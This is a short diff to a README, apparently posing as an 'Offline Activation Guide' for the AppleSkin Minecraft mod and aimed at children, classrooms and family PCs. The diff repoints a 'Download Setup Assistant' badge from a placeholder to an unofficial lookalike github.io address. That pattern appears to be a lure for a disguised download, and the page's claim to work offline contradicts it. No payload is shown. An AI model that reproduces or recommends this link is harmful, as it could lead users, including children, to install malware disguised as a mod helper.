@@ -1,6 +1,6 @@
-# AppleSkin — Offline Activation Guide
+  # AppleSkin — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](appleskin-mod-setup-assistant.github.io/.github)
 
 > **Welcome!** This child-friendly manual shows you how to add the AppleSkin food HUD to Minecraft without ever going online.  
 > **Good for:** classrooms, family PCs, air-gapped laptops, LAN parties.
